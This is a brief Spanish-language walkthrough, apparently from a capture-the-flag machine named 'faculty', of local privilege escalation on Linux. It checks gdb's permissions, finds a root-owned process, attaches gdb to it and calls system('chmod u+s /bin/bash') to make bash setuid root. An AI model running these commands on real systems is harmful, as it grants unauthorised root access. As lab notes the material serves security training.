# ENUMERACIÓN
### VERIFICAR PERMISOS DEL BINARIO
```shell
developer@faculty:/$ ls -l /usr/bin/gdb
```

### VER PROPIETARIO DEL PROCESO
```shell
developer@faculty:/$ ps -faux | grep "root"
```


# EXPLOTACIÓN
### ACCEDER AL RECURSO
```shell
developer@faculty:/$ gdb -p 692
(gdb)
```

### CAMBIAR PERMISOS DE LA BASH
```shell
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 2176]
```